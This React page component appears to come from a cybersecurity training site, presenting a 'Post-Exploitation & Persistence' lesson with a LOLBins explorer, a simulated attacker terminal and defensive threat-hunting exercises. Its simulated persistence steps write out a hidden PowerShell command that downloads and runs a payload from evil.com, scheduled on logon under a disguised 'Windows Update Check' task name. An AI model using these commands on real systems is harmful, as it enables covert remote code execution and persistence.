import { Navigation } from "@/components/Navigation";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { useState } from "react";
import { Link } from "react-router-dom";
import { Home, ChevronLeft, ChevronRight, Terminal } from "lucide-react";

const Level3 = () => {
  const [activeTab, setActiveTab] = useState("overview");
  const [selectedLOLBin, setSelectedLOLBin] = useState<string | null>(null);
  const [exploitStage, setExploitStage] = useState(0);
  const [terminalOutput, setTerminalOutput] = useState(["C:\\Users\\victim> "]);
  const [suspiciousCommands, setSuspiciousCommands] = useState<string[]>([]);
  const [disabledTask, setDisabledTask] = useState<string | null>(null);

  const lolbins = {
    "PowerShell.exe": {
      legitimate: "Execute PowerShell scripts and commands for system administration",
      malicious: "Download and execute malware, bypass execution policies, live-off-the-land attacks"
    },
    "certutil.exe": {
      legitimate: "Manage certificates and certificate stores in Windows",
      malicious: "Download malicious files from the internet, decode base64 payloads"
    },
    "schtasks.exe": {
      legitimate: "Create, modify, and manage scheduled tasks in Windows",
      malicious: "Establish persistence by creating malicious scheduled tasks"
    },
    "wmic.exe": {
      legitimate: "Query system information and manage Windows systems via WMI",
      malicious: "Execute commands remotely, gather system information, lateral movement"
    }
  };

  const exploitSteps = [
    "whoami",
    "victim\\user",
    "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
    "OS Name: Microsoft Windows 10 Pro\\nOS Version: 10.0.19041 N/A Build 19041",
    "exploit.exe",
    "[+] Exploit successful! Privilege escalation complete.",
    "whoami",
    "nt authority\\system"
  ];

  const persistenceSteps = [
    "echo @echo off > C:\\Users\\victim\\AppData\\Local\\Temp\\update.bat",
    "echo powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\" >> C:\\Users\\victim\\AppData\\Local\\Temp\\update.bat",
    "schtasks /create /tn \"Windows Update Check\" /tr \"C:\\Users\\victim\\AppData\\Local\\Temp\\update.bat\" /sc onlogon /f",
    "SUCCESS: The scheduled task \"Windows Update Check\" has successfully been created.",
    "echo Persistence mechanism established!"
  ];

  const commandHistory = [
    "dir C:\\Users",
    "whoami",
    "systeminfo",
    "netstat -an",
    "tasklist",
    "schtasks /query",
    "ipconfig /all",
    "net user"
  ];

  const scheduledTasks = [
    {
      name: "Windows Update",
      path: "C:\\Windows\\System32\\wuauclt.exe",
      suspicious: false,
      description: "Legitimate Windows Update service"
    },
    {
      name: "Adobe Updater",
      path: "C:\\Program Files\\Adobe\\Updater\\updater.exe",
      suspicious: false,
      description: "Adobe software updater"
    },
    {
      name: "Windows Update Check",
      path: "C:\\Users\\victim\\AppData\\Local\\Temp\\update.bat",
      suspicious: true,
      description: "Suspicious task pointing to user AppData folder"
    }
  ];

  const suspiciousCommandList = ["whoami", "systeminfo", "schtasks /query"];

  const nextExploitStep = () => {
    if (exploitStage === 0) {
      // First click - start privilege escalation
      const newOutput = [...terminalOutput];
      newOutput.push(exploitSteps[0]); // whoami
      newOutput.push(exploitSteps[1]); // victim\user
      newOutput.push(exploitSteps[2]); // systeminfo
      newOutput.push(exploitSteps[3]); // OS info
      newOutput.push("C:\\Users\\victim> ");
      setTerminalOutput(newOutput);
      setExploitStage(1);
    } else if (exploitStage === 1) {
      // Second click - run exploit
      const newOutput = [...terminalOutput];
      newOutput.push(exploitSteps[4]); // exploit.exe
      newOutput.push(exploitSteps[5]); // success message
      newOutput.push(exploitSteps[6]); // whoami
      newOutput.push(exploitSteps[7]); // nt authority\system
      newOutput.push("C:\\Windows\\system32> ");
      setTerminalOutput(newOutput);
      setExploitStage(2);
    } else if (exploitStage === 2) {
      // Third click - establish persistence
      const newOutput = [...terminalOutput];
      persistenceSteps.forEach(step => newOutput.push(step));
      newOutput.push("C:\\Windows\\system32> ");
      setTerminalOutput(newOutput);
      setExploitStage(3);
    }
  };

  const handleCommandClick = (command: string) => {
    if (suspiciousCommandList.includes(command) && !suspiciousCommands.includes(command)) {
      setSuspiciousCommands([...suspiciousCommands, command]);
    }
  };

  const handleTaskDisable = (taskName: string, suspicious: boolean) => {
    if (suspicious) {
      setDisabledTask(taskName);
    } else {
      // Wrong choice
      setDisabledTask("wrong");
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <Navigation />
      
      <main className="pt-24 px-4">
        <div className="container mx-auto max-w-4xl">
          {/* Header */}
          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold mb-4 cyber-gradient">
              Level 3: Post-Exploitation & Persistence
            </h1>
            <p className="text-xl text-muted-foreground">
              Learn what happens after the breach: how attackers maintain control and hide their tracks.
            </p>
          </div>

          {/* Tab Navigation */}
          <div className="sticky top-20 z-40 glass border border-border/50 rounded-lg p-1 mb-8">
            <div className="flex space-x-1">
              {[
                { id: "overview", label: "1. Overview: Living Off the Land" },
                { id: "offensive", label: "2. Offensive Ops" },
                { id: "defensive", label: "3. Defensive Ops" }
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`flex-1 px-4 py-2 rounded-md font-medium transition-all ${
                    activeTab === tab.id 
                      ? 'bg-primary text-primary-foreground' 
                      : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  {tab.label}
                </button>
              ))}
            </div>
          </div>

          {/* Tab Content */}
          <div className="space-y-8 mb-16">
            {activeTab === "overview" && (
              <div className="space-y-8">
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>Living Off the Land: Hiding in Plain Sight</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <p className="text-muted-foreground mb-6">
                      Living Off the Land Binaries (LOLBins) are legitimate system tools that attackers abuse 
                      for malicious purposes. By using trusted, signed binaries, attackers can bypass security 
                      controls and blend in with normal system activity.
                    </p>
                  </CardContent>
                </Card>

                {/* LOLBins Explorer */}
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>LOLBins Explorer</CardTitle>
                    <CardDescription>Click on each binary to learn about its legitimate and malicious uses</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                      {Object.keys(lolbins).map((binary) => (
                        <button
                          key={binary}
                          onClick={() => setSelectedLOLBin(binary)}
                          className={`p-4 rounded-lg border transition-all hover-lift text-center ${
                            selectedLOLBin === binary 
                              ? 'border-primary bg-primary/10' 
                              : 'border-border glass hover:border-primary/50'
                          }`}
                        >
                          <Terminal className="w-8 h-8 mx-auto mb-2 text-primary" />
                          <div className="text-sm font-medium">{binary}</div>
                        </button>
                      ))}
                    </div>
                    
                    {selectedLOLBin && (
                      <Card className="glass">
                        <CardHeader>
                          <CardTitle className="text-lg">{selectedLOLBin}</CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-4">
                          <div>
                            <h4 className="font-semibold text-green-400 mb-2">Legitimate Use:</h4>
                            <p className="text-sm text-muted-foreground">
                              {lolbins[selectedLOLBin as keyof typeof lolbins].legitimate}
                            </p>
                          </div>
                          <div>
                            <h4 className="font-semibold text-red-400 mb-2">Malicious Use:</h4>
                            <p className="text-sm text-muted-foreground">
                              {lolbins[selectedLOLBin as keyof typeof lolbins].malicious}
                            </p>
                          </div>
                        </CardContent>
                      </Card>
                    )}
                  </CardContent>
                </Card>
              </div>
            )}

            {activeTab === "offensive" && (
              <div className="space-y-8">
                <Card className="glass border-red-500/30">
                  <CardHeader>
                    <CardTitle className="text-red-400">Offensive Ops: Owning the Box</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <p className="text-muted-foreground">
                      After gaining initial access, attackers need to escalate privileges and establish 
                      persistence to maintain long-term access to the compromised system.
                    </p>
                  </CardContent>
                </Card>

                {/* Multi-stage Terminal Simulation */}
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>From User to Admin</CardTitle>
                    <CardDescription>Follow the privilege escalation and persistence establishment process</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="terminal p-4 rounded-lg font-mono text-sm max-h-96 overflow-y-auto">
                      {terminalOutput.map((line, index) => (
                        <div key={index} className="whitespace-pre-line break-words">{line}</div>
                      ))}
                    </div>
                    
                    <Button 
                      onClick={nextExploitStep}
                      variant="destructive"
                      disabled={exploitStage >= 3}
                      className="flex items-center gap-2"
                    >
                      <Terminal className="w-4 h-4" />
                      {exploitStage === 0 && "Stage 1: Privilege Escalation"}
                      {exploitStage === 1 && "Run Exploit"}
                      {exploitStage === 2 && "Stage 2: Establish Persistence"}
                      {exploitStage >= 3 && "Persistence Established"}
                    </Button>
                    
                    {exploitStage >= 3 && (
                      <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-lg">
                        <p className="text-red-400 font-semibold">🎯 Complete! The attacker now has persistent administrative access.</p>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>
            )}

            {activeTab === "defensive" && (
              <div className="space-y-8">
                <Card className="glass border-blue-500/30">
                  <CardHeader>
                    <CardTitle className="text-blue-400">Defensive Ops: The Hunt is On</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <p className="text-muted-foreground">
                      Proactive threat hunting involves looking for signs of compromise and suspicious 
                      activity that automated tools might miss.
                    </p>
                  </CardContent>
                </Card>

                {/* Command History Analysis */}
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>Command-Line History Analysis</CardTitle>
                    <CardDescription>Click on suspicious commands in this user's command history</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="terminal p-4 rounded-lg space-y-1">
                      {commandHistory.map((command, index) => (
                        <div
                          key={index}
                          onClick={() => handleCommandClick(command)}
                          className={`cursor-pointer hover:bg-white/10 p-1 rounded transition-colors ${
                            suspiciousCommands.includes(command) ? 'bg-red-500/20 text-red-400' : ''
                          }`}
                        >
                          C:\Users\victim&gt; {command}
                        </div>
                      ))}
                    </div>
                    
                    {suspiciousCommands.length > 0 && (
                      <div className="space-y-2">
                        <h4 className="font-semibold text-red-400">Suspicious Commands Identified:</h4>
                        <ul className="space-y-1 text-sm">
                          <li className="text-red-400">• <strong>whoami</strong> - Reconnaissance: checking current user privileges</li>
                          <li className="text-red-400">• <strong>systeminfo</strong> - System enumeration for vulnerability identification</li>
                          <li className="text-red-400">• <strong>schtasks /query</strong> - Investigating scheduled tasks for persistence opportunities</li>
                        </ul>
                      </div>
                    )}
                    
                    {suspiciousCommands.length === suspiciousCommandList.length && (
                      <div className="p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
                        <p className="text-green-400 font-semibold">🎉 All suspicious commands identified!</p>
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* Scheduled Task Analysis */}
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>Scheduled Task Analysis</CardTitle>
                    <CardDescription>Identify and disable the malicious scheduled task</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="space-y-3">
                      {scheduledTasks.map((task, index) => (
                        <div key={index} className="p-4 glass rounded-lg">
                          <div className="flex justify-between items-start mb-2">
                            <div>
                              <h4 className="font-semibold">{task.name}</h4>
                              <p className="text-sm text-muted-foreground">{task.path}</p>
                              <p className="text-xs text-muted-foreground mt-1">{task.description}</p>
                            </div>
                            <div className="flex gap-2">
                              <Button 
                                size="sm" 
                                variant="cyber-ghost"
                                disabled={!!disabledTask}
                              >
                                Details
                              </Button>
                              <Button 
                                size="sm" 
                                variant="destructive"
                                disabled={!!disabledTask}
                                onClick={() => handleTaskDisable(task.name, task.suspicious)}
                              >
                                Disable
                              </Button>
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                    
                    {disabledTask === "Windows Update Check" && (
                      <div className="p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
                        <p className="text-green-400 font-semibold">✅ Persistence mechanism eradicated!</p>
                        <p className="text-sm text-muted-foreground mt-1">
                          The suspicious task pointing to the user's AppData folder has been disabled.
                        </p>
                      </div>
                    )}
                    
                    {disabledTask === "wrong" && (
                      <div className="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-lg">
                        <p className="text-yellow-400 font-semibold">⚠️ Wrong choice!</p>
                        <p className="text-sm text-muted-foreground mt-1">
                          That's a legitimate system task. Look for tasks with suspicious file paths.
                        </p>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>
            )}
          </div>

          {/* Navigation Buttons */}
          <div className="flex justify-between items-center py-8">
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/level/2" className="flex items-center gap-2">
                <ChevronLeft className="w-4 h-4" />
                Previous
              </Link>
            </Button>
            
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/" className="flex items-center gap-2">
                <Home className="w-4 h-4" />
                Home
              </Link>
            </Button>
            
            <Button asChild variant="cyber" size="lg">
              <Link to="/level/4" className="flex items-center gap-2">
                Next
                <ChevronRight className="w-4 h-4" />
              </Link>
            </Button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Level3;